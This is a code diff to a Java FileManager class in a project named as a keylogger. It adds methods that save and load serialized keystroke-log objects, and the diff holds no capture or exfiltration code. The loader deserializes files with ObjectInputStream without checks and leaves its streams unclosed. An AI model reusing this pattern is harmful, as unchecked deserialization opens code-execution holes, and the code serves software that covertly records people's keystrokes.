@@ -8,11 +8,12 @@ import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
-import java.io.OutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
 import java.io.OutputStreamWriter;
-import java.io.UnsupportedEncodingException;
 import java.nio.charset.Charset;
 
+import com.hao.keylogger.models.Log;
 import com.hao.keylogger.models.Resources;
 
 public class FileManager {
@@ -20,6 +21,10 @@ public class FileManager {
 
 	public FileManager(String filePath) {
 		this.filePath = filePath;
+	}
+
+	public FileManager() {
+		filePath = ".";
 	}
 
 	public String readAll() throws IOException {
@@ -45,6 +50,44 @@ public class FileManager {
 		OutputStreamWriter writer = new OutputStreamWriter(new FileOutputStream(filePath), "UTF-8");
 		writer.write(content);
 		writer.close();
+	}
+	
+	/**
+	 * Save serialized log to file
+	 * @param log
+	 * @param filePath
+	 */
+	public void writeLogToFile(Log log, String filePath) {
+		try {
+			FileOutputStream fout = new FileOutputStream(filePath);
+			ObjectOutputStream out = new ObjectOutputStream(fout);
+			
+			out.writeObject(log);
+		} catch (IOException e) {
+			e.printStackTrace();
+		}
+		
+	}
+	
+	/**
+	 * Deserialize log file
+	 * @param filePath
+	 * @return a log file if successful, an empty log file if error
+	 */
+	
+	public Log loadLogFromFile(String filePath) {
+			try {
+				FileInputStream fin = new FileInputStream(filePath);
+				ObjectInputStream in = new ObjectInputStream(fin);
+				try {
+					return (Log) in.readObject();
+				} catch (ClassNotFoundException e) {
+					e.printStackTrace();
+				}
+			} catch (IOException e) {
+				e.printStackTrace();
+			}
+			return new Log();			
 	}
 
 	public String getFileName() {
